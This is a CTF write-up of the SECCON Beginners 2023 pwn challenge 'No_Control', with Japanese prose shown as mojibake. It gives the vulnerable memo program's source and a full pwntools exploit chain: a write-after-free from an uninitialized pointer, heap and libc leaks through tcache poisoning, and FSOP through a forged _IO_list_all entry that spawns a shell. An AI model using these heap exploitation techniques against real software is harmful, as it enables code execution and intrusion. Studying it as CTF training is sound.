---
title: "No_Control - SECCON Beginners CTF 2023"
emoji: "ğŸ”°"
type: "tech"
topics:
  - "ctf"
  - "pwn"
  - "seccon"
  - "ctf4b"
published: true
published_at: "2023-06-04 16:56"
---

# source code
```c: src.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <err.h>

#define LIST_SIZE 5
#define MEMO_SIZE 0x80


char *memos[LIST_SIZE] = {NULL};

int ask_index() {
    int idx = 0;
    char buf[0x100];
    printf("index: ");
    fgets(buf, 0xff, stdin);
    idx = atoi(buf);

    return idx;
}

void create_memo() {
    int idx;
    char *memo;
    idx = ask_index();

    if (idx < 0 || LIST_SIZE <= idx) {
        puts("Invalid index. now choose unused one.");
        for (idx = 0; idx < LIST_SIZE; idx++) {
            if (memos[idx] == NULL) {
                break;
            }
        }
    }

    if (LIST_SIZE <= idx) {
        puts("Can't find unused memo");
        return;
    }

    memo = malloc(MEMO_SIZE);
    memos[idx] = memo;

    return;
}

void read_memo() {
    int idx;
    char *memo;
    idx = ask_index();

    if (idx < 0 || LIST_SIZE <= idx) {
        puts("Invalid index");
        return;
    }

    memo = memos[idx];
    puts(memo);
    
    return;
}

void update_memo() {
    int idx;
    char *memo;
    idx = ask_index();

    if (idx < 0 || LIST_SIZE <= idx) {
        puts("Invalid index");
    } else if (memos[idx] == NULL) {
        puts("that memo is empty");
    } else {
        memo = memos[idx];
    }

    if (memo == NULL) {
        puts("something wrong");
    } else {
        printf("content: ");
        read(STDIN_FILENO, memo, MEMO_SIZE);
    }
    return;
}

void delete_memo() {
    int idx;
    char *memo;
    idx = ask_index();

    if (idx < 0 || LIST_SIZE <= idx) {
        puts("Invalid index");
        return;
    }

    memo = memos[idx];
    if (memo == NULL)
        return;
    free(memo);
    memos[idx] = NULL;

    return;

}

int main() {
    int idx;
    while(1) {
        printf("1. create\n"
               "2. read\n"
               "3. update\n"
               "4. delete\n"
               "5. exit\n"
               "> ");
        if (scanf("%d%*c", &idx) != 1) {
            puts("I/O Error");
            return 1;
        }

        switch (idx) {
            case 1:
                create_memo();
                break;
            case 2:
                read_memo();
                break;
            case 3:
                update_memo();
                break;
            case 4:
                delete_memo();
                break;
            case 5:
                puts("Bye");
                return 0;
            default:
                puts("Invalid index");

        }
    }

}

__attribute__((constructor))
void init() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    alarm(60);
}
```

# è„†å¼±æ€§
update_memoé–¢æ•°ã«æ³¨ç›®ã€‚memoãŒNULLã§åˆæœŸåŒ–ã•ã‚Œã¦ã„ãªã„ã®ã§ã€idxãŒä¸æ­£ãªå€¤ã§ã‚‚readé–¢æ•°ã‚’å‘¼ã³å‡ºã™ã“ã¨ãŒã§ãã‚‹ã€‚
```c: src.c
void update_memo() {
    int idx;
    char *memo;
    idx = ask_index();

    if (idx < 0 || LIST_SIZE <= idx) {
        puts("Invalid index");
    } else if (memos[idx] == NULL) {
        puts("that memo is empty");
    } else {
        memo = memos[idx];
    }

    if (memo == NULL) {
        puts("something wrong");
    } else {
        printf("content: ");
        read(STDIN_FILENO, memo, MEMO_SIZE);
    }
    return;
}
```
å•é¡Œã¯ã©ã†ã‚„ã£ã¦memoã«æœ‰åŠ¹ãªã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’æŒ‡å®šã™ã‚‹ã‹ã€‚ã“ã“ã§delete_memoé–¢æ•°ã«æ³¨ç›®ã™ã‚‹ã€‚
```c: src.c
void delete_memo() {
    int idx;
    char *memo;
    idx = ask_index();

    if (idx < 0 || LIST_SIZE <= idx) {
        puts("Invalid index");
        return;
    }

    memo = memos[idx];
    if (memo == NULL)
        return;
    free(memo);
    memos[idx] = NULL;

    return;

}
```
ãƒ‡ã‚£ã‚¹ã‚¢ã‚»ãƒ³ãƒ–ãƒ«ã™ã‚‹ã¨åˆ†ã‹ã‚‹ã®ã ãŒã€delete_memoã¨update_memoã¯åŒã˜ã‚¹ã‚¿ãƒƒã‚¯é…ç½®ã«ãªã‚‹ã€‚delete_memoã‚’å‘¼ã¶ã¨ã€delete_memoå†…ã®memoã«ã“ã‚Œã‹ã‚‰freeã•ã‚Œã‚‹ã‚¢ãƒ‰ãƒ¬ã‚¹ãŒå…¥ã‚‹ã€‚ã“ã®å¾Œã™ãã«ä¸æ­£ãªã‚¤ãƒ³ãƒ‡ãƒƒã‚¯ã‚¹ã‚’æŒ‡å®šã—ã¦update_memoã‚’å‘¼ã¶ã¨(ã‚¹ã‚¿ãƒƒã‚¯é…ç½®ãŒåŒã˜ãªã®ã§)**update_memoå†…ã®memoãŒä»Šfreeã—ãŸã‚¢ãƒ‰ãƒ¬ã‚¹ã«ãªã‚‹ã€‚** ã¤ã¾ã‚Šã€Write After FreeãŒã§ãã‚‹ã€‚ã“ã‚Œã‚’åˆ©ç”¨ã—ã¦tcache-poisoningã‚’è¡Œã†ã“ã¨ã§ä»»æ„ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã«ä»»æ„ã®å€¤ã‚’æ›¸ãè¾¼ã‚€ã“ã¨ãŒå¯èƒ½ã«ãªã‚‹ã€‚

# exploit
https://github.com/RI5255/ctf-writeups/tree/master/2023/ctf4b/No_Control

## å‰æº–å‚™
ç¹°ã‚Šè¿”ã—ä½¿ã†å‡¦ç†ã‚’é–¢æ•°ã¨ã—ã¦ã¾ã¨ã‚ã¦ãŠãã€‚
```python: solve.py
def create(idx : int):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b': ', str(idx).encode())

def read(idx : int):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b': ', str(idx).encode())
    return io.recvline()

def update(idx : int, data: bytes):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b': ', str(idx).encode())
    io.sendafter(b': ', data)

def delete(idx : int):
    io.sendlineafter(b'> ', b'4')
    io.sendlineafter(b': ', str(idx).encode())

def ex():
    io.sendlineafter(b'> ', b'5')
```
å¾Œã§ä½¿ã†chunkã‚’ç¢ºä¿ã—ã¦ãŠãã€‚
```python: solve.py
create(0) # A
create(1) # B
create(2) # C
create(3) # D
```

## heap base leak
ã¾ãšåˆã‚ã«heap baseã‚’leakã™ã‚‹ã€‚mallocã¯tcacheã«ã‚ã‚‹chunkã‚’è¿”ã™ã¨ãã€fdãƒ¡ãƒ³ãƒã‚’ä¸Šæ›¸ãã—ãªã„ã®ã§ã“ã“ã‹ã‚‰heap baseã‚’è¨ˆç®—ã™ã‚‹ã“ã¨ãŒã§ãã‚‹ã€‚ä»Šå›ã¯glibc2.35ãŒä½¿ã‚ã‚Œã¦ã„ã‚‹ã®ã§ã€tcacheã«ã¯safe-linkingãŒã‚ã‚‹äº‹ã«æ³¨æ„ã€‚
ã¾ãšAã‚’freeã—ã¦tcacheã«ç™»éŒ²ã™ã‚‹ã€‚ã“ã®æ™‚A.fdã«ã¯&A.fd>>12ãŒå…¥ã‚‹ã€‚&A.fd>>12ã¯heap_base>>12ã¨ç­‰ã—ã„ã®ã§ã€mallocã§Aã‚’å–ã‚Šè¿”ã—ãŸã‚ã¨ã«A.fdã‚’èª­ã¿å‡ºã—ã€ã“ã‚Œã‚’12bitå·¦ã‚·ãƒ•ãƒˆã™ã‚Œã°heap baseã‚’å¾—ã‚‹ã“ã¨ãŒã§ãã‚‹ã€‚
```python: solve.py
# 1: heap base leak
delete(0)
create(0)
heap_base = unpack(read(0).rstrip().ljust(8, b'\0')) << 12
log.info('heap_base = %#016lx'%(heap_base))
```
å®Ÿéš›ã€gdbã§è¦‹ã¦ã¿ã‚‹ã¨delete(0)ã®å¾Œheapã¯ä»¥ä¸‹ã®ã‚ˆã†ã«ãªã£ã¦ã„ã‚‹ã€‚ä¸Šã‹ã‚‰é †ã«tcache, A, B, C, D, Top chunkã«ãªã‚‹ã€‚Aã¯tcache(0x90)ã«ç™»éŒ²ã•ã‚Œã¦ãŠã‚Šã€A.fdã¯&A.fd>>12ã«ãªã£ã¦ã„ã‚‹ã“ã¨ãŒç¢ºèªã§ãã‚‹ã€‚

![0](https://storage.googleapis.com/zenn-user-upload/f4043978f80c-20230604.png)

create(0)ã®mallocå®Ÿè¡Œç›´å¾Œã¾ã§é€²ã‚ã‚‹ã¨heapã¯ä»¥ä¸‹ã®ã‚ˆã†ã«ãªã‚‹ã€‚tcacheã«å…¥ã£ã¦ã„ãŸAãŒè¿”ã£ã¦ãŠã‚Šã€A.fdã¯ãã®ã¾ã¾æ®‹ã£ã¦ã„ã‚‹ã“ã¨ãŒç¢ºèªã§ãã‚‹ã€‚

![1](https://storage.googleapis.com/zenn-user-upload/9e8aa7194ff9-20230604.png)

## libc base leak
æ¬¡ã«libc baseã‚’leakã™ã‚‹ã€‚libc baseã‚’leakã™ã‚‹ãŸã‚ã«ã¯chunkã‚’unsorted binã«ç¹‹ã„ã å¾Œã§chunk.fdã‚’èª­ã¿å‡ºã™å¿…è¦ãŒã‚ã‚‹ãŒã€ä»Šå›memosã¯è¦ç´ æ•°ãŒ5ãªã®ã§ã€malloc-freeã‚’ç¹°ã‚Šè¿”ã—ã¦tcacheã‚’æ¯æ¸‡ã•ã›ã‚‹ã“ã¨ã¯ã§ããªã„ã€‚ãã“ã§åˆ¥ã®æ–¹æ³•ã‚’è€ƒãˆã‚‹ã€‚tcacheã¯ä»¥ä¸‹ã®ã‚ˆã†ã«å®šç¾©ã•ã‚Œã¦ã„ã‚‹ã€‚
```c: malloc/malloc.c#L3138
typedef struct tcache_perthread_struct
{
  uint16_t counts[TCACHE_MAX_BINS];
  tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;
```
tcacheã®ã‚¨ãƒ³ãƒˆãƒªæ•°ã¯ã“ã®countsã§ç®¡ç†ã•ã‚Œã‚‹ãŸã‚ã€ã“ã‚Œã‚’æ›¸ãå¤‰ãˆã‚Œã°å®Ÿéš›ã«freeã—ãªãã¦ã‚‚tcache(0x90)ãŒæº€æ¯ã ã¨èªè­˜ã•ã›ã‚‹ã“ã¨ãŒã§ãã‚‹ã€‚
ãã®å‰ã«ã¾ãšä»¥ä¸‹ã®ã‚ˆã†ã«ã—ã¦Cã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’å¾—ã¦ãŠãã€‚
```python: solve.py
# 2: libc base leak
chunkB = heap_base + 0x290 + 0x90
chunkC = chunkB + 0x90

# tcache(0x90): B -> A
delete(0)
delete(1)

# tcache(0x90): B -> C
update(-1, pack(((chunkB + 0x10)>>12) ^ chunkC + 0x10) + b'\n')

# tcache(0x90):
create(1)
create(4)
create(0)
```
ã“ã‚ŒãŒå¿…è¦ãªã®ã¯delete_memoé–¢æ•°ã®ä»¥ä¸‹ã®éƒ¨åˆ†ãŒã‚ã‚‹ã‹ã‚‰ã€‚
```c: src.c
    free(memo);
    memos[idx] = NULL;
```
å¾Œã§Cã‚’unsorted binã«ç¹‹ã„ã§C.fdã‚’èª­ã¿å‡ºã™ã®ã ãŒã€ã“ã®éƒ¨åˆ†ãŒã‚ã‚‹ãŸã‚ã«delete(2)ã§Cã‚’unsorted binã«ç¹‹ãã¨Cã®ã‚¢ãƒ‰ãƒ¬ã‚¹ãŒå¤±ã‚ã‚Œã¦ã—ã¾ã†ã€‚ãã®ãŸã‚ã€ä¸Šã§ã¯tcache-poisoningã«ã‚ˆã£ã¦memos[4]ã«Cã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ä¿å­˜ã—ã¦ã„ã‚‹ã€‚delete(2)ã§memos[2]ãŒNULLã§ä¸Šæ›¸ãã•ã‚Œã¦ã‚‚ã€memos[4]ã«Cã®ã‚¢ãƒ‰ãƒ¬ã‚¹ãŒå…¥ã£ã¦ã„ã‚‹ã®ã§C.fdã‚’èª­ã¿å‡ºã™ã“ã¨ãŒã§ãã‚‹ã€‚
æ¬¡ã«countsã‚’æ›¸ãå¤‰ãˆã‚‹ã€‚tcacheã¯ä¸Šã§è¦‹ãŸé€šã‚Šheap baseã®ä½ç½®ã«ã‚ã‚Šã€ã‹ã¤ä»Šheap baseã¯æ—¢çŸ¥ãªã®ã§tcache-poisoningã«ã‚ˆã‚Štcaacheã‚’æ›¸ãå¤‰ãˆã‚‹ã“ã¨ãŒã§ãã‚‹ã€
```python: solve.py
# tcache(0x90): B -> A
delete(0)
delete(1)

# tcahce(0x90): B -> &tcache
update(-1, pack(((chunkB + 0x10)>>12) ^ heap_base) + b'\n')

# overwrite counts[7] with 7
create(1)
create(0)
update(0, pack(0) + pack(0x291) + pack(0x0) + pack(0x7000000000000))

delete(2)
l.address = unpack(read(4).rstrip().ljust(8, b'\0')) - 0x219ce0
log.info('libc_base = %#016lx'%(l.address))
```
å®Ÿéš›ã€ä¸Šã®delete(1)ã‚’å®Ÿè¡Œã™ã‚‹ã¨ã€heapã¯ä»¥ä¸‹ã®ã‚ˆã†ã«ãªã‚‹ã€‚tcache(0x90)ã«ã¯2ã¤ã®ã‚¨ãƒ³ãƒˆãƒªãŒã‚ã‚‹ã®ã§ã€counts[7]ã¯2ã«ãªã£ã¦ã„ã‚‹ã€‚(tcacheã¯0x20ã‹ã‚‰0x10åˆ»ã¿ãªã®ã§ã€0x70ã®indexã¯(0x70-0x20)/0x10=7ã«ãªã‚‹)

![2](https://storage.googleapis.com/zenn-user-upload/e0679aa96d17-20230604.png)

ãã®å¾Œã®updateã‚’å®Ÿè¡Œã™ã‚‹ã¨heapä»¥ä¸‹ã®ã‚ˆã†ã«ãªã‚‹ã€‚tcahce-poisoningãŒæˆåŠŸã—ã€tcacheã«tcacheã®ã‚¢ãƒ‰ãƒ¬ã‚¹ãŒå…¥ã£ã¦ã„ã‚‹ã“ã¨ãŒåˆ†ã‹ã‚‹ã€‚

![3](https://storage.googleapis.com/zenn-user-upload/2666cea0f3b5-20230604.png)

ã“ã®çŠ¶æ…‹ã§2å›createã‚’å‘¼ã¹ã°ã€2å›ç›®ã®createã§tcacheã®ã‚¢ãƒ‰ãƒ¬ã‚¹ãŒè¿”ã•ã‚Œã‚‹ã€‚å®Ÿéš›ã€ä¸Šã®create(0)ã®mallocå®Ÿè¡Œç›´å¾Œã¾ã§é€²ã‚ã‚‹ã¨ä»¥ä¸‹ã®ã‚ˆã†ã«ãªã‚Šã€tcacheã®ã‚¢ãƒ‰ãƒ¬ã‚¹ãŒå¾—ã‚‰ã‚Œã¦ã„ã‚‹ã“ã¨ãŒåˆ†ã‹ã‚‹ã€‚

![4](https://storage.googleapis.com/zenn-user-upload/73a3654389bd-20230604.png)

æ¬¡ã®updateã‚’å®Ÿè¡Œã™ã‚‹ã¨heapã¯ä»¥ä¸‹ã®ã‚ˆã†ã«ãªã‚‹ã€‚counts[7]ãŒtcacheã®æœ€å¤§ã‚¨ãƒ³ãƒˆãƒªæ•°ã§ã‚ã‚‹7ã«æ›¸ãå¤‰ã‚ã£ã¦ã„ã‚‹ã“ã¨ãŒç¢ºèªã§ãã‚‹ã€‚

![5](https://storage.googleapis.com/zenn-user-upload/8fa17a20e022-20230604.png)

ã“ã®çŠ¶æ…‹ã§Cã‚’freeã™ã‚‹ã¨ã€tcache(0x90)ãŒæº€æ¯ã ã¨åˆ¤æ–­ã•ã‚Œã‚‹ãŸã‚ã€CãŒunsorted binã«å…¥ã‚‹ã€‚å®Ÿéš›ã€ä¸Šã®delete(2)ã‚’å®Ÿè¡Œã™ã‚‹ã¨heapã¯ä»¥ä¸‹ã®ã‚ˆã†ã«ãªã‚‹ã€‚

![6](https://storage.googleapis.com/zenn-user-upload/9065bec5f0d8-20230604.png)

å¾Œã¯C.fdã‚’èª­ã¿å‡ºã›ã°ã‚ˆã„ã€‚delete(2)ã«ã‚ˆã£ã¦memos[2]ã¯NULLã§ä¸Šæ›¸ãã•ã‚Œã‚‹ãŒã€æœ€åˆã«memos[4]ã«Cã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ä¿å­˜ã—ã¦ã„ãŸã®ã§ã€read(4)ã‚’å®Ÿè¡Œã™ã‚Œã°C.fdãŒèª­ã¿å‡ºã›ã‚‹ã€‚
C.fdã¨libc baseã¨ã®offsetã‚’è¨ˆç®—ã™ã‚‹ã¨0x219ce0ã ã£ãŸã®ã§ã€ã“ã‚Œã‚’å¼•ã‘ã°libc baseãŒå–å¾—ã§ãã‚‹ã€‚
æœ€å¾Œã«ä»¥ä¸‹ã®ã‚ˆã†ã«ã—ã¦counts[7]ã‚’0ã«ã—ã€ã¾ãŸä¸Šã§unsorted binã«ã„ã‚ŒãŸCã‚’å–ã‚Šè¿”ã—ã¦ãŠãã€‚
```python: solve.py
# overwrite counts[7] with 0
update(0, pack(0) + pack(0x291) + pack(0x0) + pack(0))
create(0)
```
ã“ã‚Œã‚’å®Ÿè¡Œã™ã‚‹ã¨heapã¯ä»¥ä¸‹ã®ã‚ˆã†ã«ãªã‚Šã€tcache(0x90), unsorted binãŒç©ºã«ãªã‚‹ã€‚
![7](https://storage.googleapis.com/zenn-user-upload/7e36f3f86102-20230604.png)

counts[7]ã‚’0ã«ã—ã¦ã„ã‚‹ã®ã¯ã€ãã†ã—ãªã„ã¨æ¬¡ã«createã‚’èª­ã‚“ã éš›ã«mallocã¯tcache(0x90)ã‹ã‚‰chunkã‚’è¿”ãã†ã¨ã—ã€(ä¸Šã§ã¯countsã‚’æ›¸ãå¤‰ãˆãŸã ã‘ã§å®Ÿéš›ã«free chunkãŒã‚ã‚‹ã‚ã‘ã§ã¯ãªã„ã®ã§)abortã§è½ã¡ã‚‹ã‹ã‚‰ã€‚unsorted binã«å…¥ã£ã¦ã„ã‚‹Cã‚’å–ã‚Šè¿”ã—ã¦ã„ã‚‹ã®ã¯FSOPã‚’è¡Œã†éš›ã«é€£ç¶šã—ãŸãƒ¡ãƒ¢ãƒªé ˜åŸŸãŒæ¬²ã—ã‹ã£ãŸã‹ã‚‰ã€‚

## FSOP
heap baseã‚‚libc baseã‚‚åˆ†ã‹ã£ãŸã®ã§ã€PC Controlã‚’å¥ªå–ã§ãã‚Œã°çµ‚ã‚ã‚Šã€‚ä»Šå›ã®å•é¡Œã¯Full RELROã‹ã¤PIE enabledãªã®ã§Got Overwriteã‚„ã€return addressã®æ›¸ãå¤‰ãˆã¯ä½¿ãˆãªã„ã€‚ãã“ã§FSOPã‚’ä½¿ã†ã“ã¨ã«ã—ãŸã€‚(ã‚‚ã£ã¨ã„ã„æ–¹æ³•ãŒã‚ã‚‹ã‹ã‚‚)FSOPã«ã¤ã„ã¦ã¯ã“ã®è¨˜äº‹[^1]ã§çœŸé¢ç›®ã«è§£èª¬ã—ãŸã®ã§èª¬æ˜ã¯å‰²æ„›ã™ã‚‹ã€‚
ã¾ãšä»¥ä¸‹ã®ã‚ˆã†ã«ã—ã¦å½ã®_IO_FILE_plusæ§‹é€ ä½“ã€_IO_wide_dataæ§‹é€ ä½“ã€ _IO_jump_tæ§‹é€ ä½“ã‚’ä½œã‚‹ã€‚
```python: solve.py
# 3: FSOP
create(0) # A
create(1) # B
create(2) # C
create(3) # D
create(4) # E

chunkA = heap_base + 0x560
wide_data = wide_vtable = chunkA + 0xf0

update(0, b'  sh\0\n')
update(
    1, 
    b'\0' * 0x10 \
    + pack(wide_data) \
    + b'\0' * 0x18 \
    + p32(1) \
    + b'\0' * 0x14 \
    + pack(l.sym['_IO_wfile_jumps']) \
    + b'\0' * 0x20 \
    + pack(1) \
    + b'\0' * 0x8
)
update(
    2, 
    b'\0' * 0x28 \
    + pack(l.sym['system']) # _do_allocate \
    + b'\n'
)
update(
    3,
    b'\0' * 0x10 \
    + pack(wide_vtable)
)
```
å¾Œã¯ä»¥ä¸‹ã®ã‚ˆã†ã«ã—ã¦ã€_IO_list_allã«ä¸Šã§ç”¨æ„ã—ãŸå½ã®_IO_FILE_plusæ§‹é€ ä½“ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’æ›¸ãè¾¼ã‚ã°ã‚ˆã„ã€‚
```python: solve.py
# tcahce(0x90): D -> C
delete(2)
delete(3)

# tcache(0x90): D -> &_IO_list_all
chunkD = chunkA + 0x90 * 3
update(-1, pack(((chunkD + 0x10)>>12) ^ l.sym['_IO_list_all']) + b'\n')

create(3)
create(2)
update(2, pack(chunkA + 0x10) + b'\n')
```
å®Ÿéš›ã€æœ€åˆã®updateã‚’å®Ÿè¡Œã™ã‚‹ã¨heapã¯ä»¥ä¸‹ã®ã‚ˆã†ã«ãªã‚Šã€tcacheã«&_IO_list_allãŒå…¥ã‚‹ã€‚

![8](https://storage.googleapis.com/zenn-user-upload/83b131027b19-20230604.png)

ä¸Šã®crate(2)ã§&_IO_list_allãŒè¿”ã‚‹ã®ã§ã€updateã‚’ç”¨ã„ã¦ä¸Šã§ç”¨æ„ã—ãŸå½ã®_IO_FILE_plusæ§‹é€ ä½“ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’æ›¸ãè¾¼ã‚€ã€‚ã“ã‚Œã‚’å®Ÿè¡Œã™ã‚‹ã¨ä»¥ä¸‹ã®ã‚ˆã†ã«ãªã‚Šã€æ”»æ’ƒãŒæˆåŠŸã—ã¦ã„ã‚‹ã“ã¨ãŒåˆ†ã‹ã‚‹ã€‚

![9](https://storage.googleapis.com/zenn-user-upload/9157d8eec680-20230604.png)

å¾Œã¯exitã‚’å‘¼ã¹ã°æœ€çµ‚çš„ã«system("  sh")ãŒå®Ÿè¡Œã•ã‚Œã€ãƒ•ãƒ©ã‚°ãŒå–å¾—ã§ãã‚‹ã€‚
```python: solve.py
ex()

io.interactive()
```

![10](https://storage.googleapis.com/zenn-user-upload/5a1c331e8e30-20230604.png)

[^1]: https://zenn.dev/ri5255/articles/dfc517df9467cd#fsop-in-libc2.34

